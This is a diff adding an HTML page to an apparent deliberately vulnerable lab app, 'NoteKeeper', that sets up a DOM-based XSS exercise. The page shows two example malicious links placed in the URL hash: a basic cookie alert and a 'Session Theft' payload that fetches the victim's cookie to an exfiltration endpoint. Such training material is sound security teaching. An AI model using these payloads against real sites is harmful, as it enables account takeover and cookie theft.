@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin View - NoteKeeper</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gradient-to-br from-purple-900 via-indigo-900 to-blue-900 text-white min-h-screen">
+    <div class="container mx-auto px-6 py-12">
+        <div class="max-w-2xl mx-auto">
+            <!-- Admin Badge -->
+            <div class="bg-purple-500/30 border border-purple-400 rounded-lg p-4 mb-8">
+                <div class="flex items-center space-x-3">
+                    <svg class="w-6 h-6 text-purple-300" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"/>
+                    </svg>
+                    <div>
+                        <p class="font-semibold">Logged in as Administrator</p>
+                        <p class="text-sm text-white/70">Session active</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Scenario Explanation -->
+            <div class="bg-white/10 backdrop-blur-md rounded-lg shadow-2xl p-8">
+                <h2 class="text-2xl font-bold mb-4">Exploitation Scenario</h2>
+                <p class="text-white/80 mb-4">
+                    You are simulating an <strong>admin user</strong>. An attacker has sent you a malicious
+                    link that exploits a DOM-based XSS vulnerability.
+                </p>
+
+                <div class="bg-black/30 rounded-lg p-6 mb-6">
+                    <p class="text-sm font-semibold mb-3">Example Malicious Links:</p>
+                    <div class="space-y-3 text-xs font-mono">
+                        <div class="bg-black/40 p-3 rounded">
+                            <p class="text-white/60 mb-1">Basic XSS:</p>
+                            <a href="/#<img src=x onerror=alert(document.cookie)>"
+                               class="text-blue-400 hover:text-blue-300 break-all">
+                                /#&lt;img src=x onerror=alert(document.cookie)&gt;
+                            </a>
+                        </div>
+
+                        <div class="bg-black/40 p-3 rounded">
+                            <p class="text-white/60 mb-1">Session Theft:</p>
+                            <a href="/#<img src=x onerror=fetch('/api/exfiltrate?session='+document.cookie)>"
+                               class="text-blue-400 hover:text-blue-300 break-all">
+                                /#&lt;img src=x onerror=fetch('/api/exfiltrate?session='+document.cookie)&gt;
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-yellow-500/20 border border-yellow-500/50 rounded-lg p-4">
+                    <p class="text-sm">
+                        💡 <strong>Tip:</strong> The vulnerability is in the client-side JavaScript.
+                        View the page source to analyze how notes are rendered from the URL hash.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
